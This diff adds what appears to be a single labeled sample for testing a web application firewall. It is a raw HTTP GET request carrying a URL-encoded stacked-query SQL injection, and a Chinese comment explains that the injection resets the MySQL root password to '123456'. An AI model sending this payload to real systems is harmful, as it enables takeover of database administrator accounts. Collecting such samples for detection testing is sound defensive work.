@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_普通注入-06506227
+# 攻击者基于堆叠查询，将"set PASSWORD for 'root'@'localhost'"语句注入到原始SQL语句结尾，修改数据库中具有管理员权限的用户（'root'@'localhost'）的密码为'123456'。通过成功执行该SQL注入攻击，攻击者可以更改管理员用户的密码，从而完全控制拥有管理员权限的数据库账户。这可能导致严重的安全问题，攻击者可以以管理员的身份进行未授权的数据操纵、数据删除或者篡改操作，进一步危害整个数据库系统的安全性。
+GET /?id=1%3Bset%20PASSWORD%20for%20%27root%27@%27localhost%27%20=%20PASSWORD%28%27123456%27%29&bid=hd_tag_m8mv24fc HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24fc
+RM-PRO-Token: 2ed28246597b853f97e6b9990ff7468f
+RM-PRO-Time: 1742808379467
+User-Agent: curl/7.83.1
+
